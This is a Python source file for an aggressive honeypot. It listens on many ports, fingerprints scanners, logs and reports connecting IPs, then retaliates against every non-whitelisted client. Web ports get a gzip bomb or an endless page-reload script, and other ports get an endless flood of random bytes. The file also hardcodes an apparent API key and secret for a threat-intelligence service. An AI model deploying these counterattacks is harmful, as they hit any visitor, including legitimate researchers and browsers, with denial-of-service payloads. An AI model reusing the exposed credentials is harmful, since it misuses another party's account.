import socket
import threading
import time
import os
import binascii
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter, IsMaliciousReporter

# CONFIGURACIÓN HELL v2.3.1: INTELLIGENCE SYNC
HOST = '0.0.0.0'
WEB_PORTS = [80, 443, 8080, 8081, 8082, 8090, 8443, 9200]
LETHAL_PORTS = [2222, 3389, 4455]
RAW_PORTS = [23, 445, 1433, 2323, 2525, 3306, 6379, 1337, 2375, 8125, 5060, 5900, 110, 5555]

PORTS = WEB_PORTS + LETHAL_PORTS + RAW_PORTS
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

VT_KEY = os.getenv("VT_API_KEY", "")
ISM_KEY = "b0959d3e-97c6-451f-9f95-5148c2da7ddd"
ISM_SECRET = "643a5731-1af4-4632-b75c-65955138288a"
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        os.makedirs("logs", exist_ok=True)
        self.vt_reporter = VirusTotalReporter(VT_KEY)
        self.ism_reporter = IsMaliciousReporter(ISM_KEY, ISM_SECRET)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE v2.3.1: Vigilando {len(PORTS)} puertos con Intelligence Sync.")

    def detect_scanner(self, data):
        """Identifica la herramienta de escaneo basada en firmas de payload."""
        data_str = data.decode('utf-8', errors='ignore')
        data_hex = binascii.hexlify(data).decode('utf-8')

        if "nmap" in data_str.lower(): return "Nmap Scripting Engine"
        if "masscan" in data_str.lower(): return "Masscan"
        if "zgrab" in data_str.lower(): return "ZGrab Scanner"
        if "shodan" in data_str.lower(): return "Shodan Bot"
        
        if data_hex.startswith("474554202f2048545450"): return "Generic HTTP Bot"
        if data_hex.startswith("5353482d322e30"): return "SSH Brute-forcer"
        
        if not data: return "TCP Stealth Scan"
        return "Unknown Bot"

    def log_event(self, ip, port, local_port, scanner, payload, intel_data=None):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        hostname = "N/A"
        try: hostname = socket.gethostbyaddr(ip)[0]
        except: pass

        payload_preview = binascii.hexlify(payload[:32]).decode('utf-8') + "..." if payload else "None"
        
        intel_status = "Checked (Safe/Unknown)"
        if intel_data and intel_data.get('is_malicious'):
            intel_status = f"🔴 MALICIOUS (Score: {intel_data.get('score')})"

        log_entry = (
            f"[{timestamp}] [HIT] {ip} ({hostname}) -> Port:{local_port}\n"
            f"    └─ Scanner: {scanner}\n"
            f"    └─ Intel: {intel_status}\n"
            f"    └─ First Bytes: {payload_preview}\n"
        )
        
        with open(LOG_FILE, "a", encoding='utf-8') as f:
            f.write(log_entry)
        print(f"[*] {scanner} ({intel_status}) desde {ip} en puerto {local_port}")

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            client_socket.close(); return

        try:
            client_socket.settimeout(2.0)
            try: payload = client_socket.recv(1024)
            except: payload = b""

            # Intel Check & Report
            intel_result = self.ism_reporter.check_ip(addr[0])
            scanner_type = self.detect_scanner(payload)
            self.log_event(addr[0], addr[1], local_port, scanner_type, payload, intel_result)
            self.vt_reporter.report_ip(addr[0])

            # --- Ejecutar Contraataque ---
            if local_port in WEB_PORTS:
                if os.path.exists(GZIP_BOMB_PATH):
                    with open(GZIP_BOMB_PATH, "rb") as b: bomb_data = b.read()
                    header = f"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: {len(bomb_data)}\r\n\r\n"
                    client_socket.send(header.encode() + bomb_data)
                else:
                    client_socket.send(b"HTTP/1.1 200 OK\r\n\r\n<script>while(1)location.reload();</script>")

            elif local_port in LETHAL_PORTS:
                while True:
                    client_socket.send(os.urandom(1024))
                    time.sleep(0.001)
            else:
                while True:
                    client_socket.send(os.urandom(4096))
                    time.sleep(0.1)

        except: pass
        finally:
            try: client_socket.close()
            except: pass

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, port))
            server.listen(100)
            while True:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port), daemon=True).start()
        except: pass

    def start(self):
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True:
            try: time.sleep(1)
            except KeyboardInterrupt: break

if __name__ == "__main__":
    HellServer().start()
